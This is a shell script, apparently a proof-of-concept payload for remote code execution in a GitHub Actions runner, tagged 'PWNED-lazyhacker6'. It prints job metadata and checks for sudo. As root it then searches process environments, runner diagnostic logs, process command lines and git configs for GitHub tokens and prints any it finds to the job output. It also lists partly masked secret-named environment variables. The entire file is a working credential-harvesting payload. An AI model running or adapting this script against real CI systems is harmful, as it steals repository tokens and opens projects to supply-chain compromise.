#!/bin/sh
echo "===PWNED-lazyhacker6-RCE-V3==="
echo "job=${GITHUB_JOB:-} event=${GITHUB_EVENT_NAME:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} actor=${GITHUB_ACTOR:-}"
id 2>/dev/null || true
uname -a 2>/dev/null || true
echo "--- sudo check ---"
if sudo -n true 2>/dev/null; then
  echo "sudo=yes"
  echo "--- token scan: process environments (root) ---"
  sudo sh -c 'for p in /proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -a "^GITHUB_TOKEN=ghs_" && echo "  src=$p"; done' 2>/dev/null | head -6
  echo "--- token scan: runner diag logs ---"
  sudo sh -c 'grep -aoh "ghs_[A-Za-z0-9]\{20,\}" /home/runner/actions-runner/_diag/*.log 2>/dev/null | head -2'
  echo "--- token scan: runner process cmdlines ---"
  sudo sh -c 'for p in /proc/[0-9]*/cmdline; do tr "\0" " " < "$p" 2>/dev/null | grep -a -o "ghs_[A-Za-z0-9]\{20,\}"; done' 2>/dev/null | head -2
  echo "--- token scan: git configs under /home ---"
  sudo sh -c 'grep -rah "ghs_[A-Za-z0-9]\{20,\}" /home/runner/.config /home/runner/.gitconfig /home/runner/work 2>/dev/null | head -2'
else
  echo "sudo=no"
fi
echo "--- credential env presence ---"
env | grep -aiE 'token|secret|key' | sed -E 's/=(.{0,6}).*/=\1.../' | sort | head -20
echo "===PWNED-lazyhacker6-END==="
exit 1
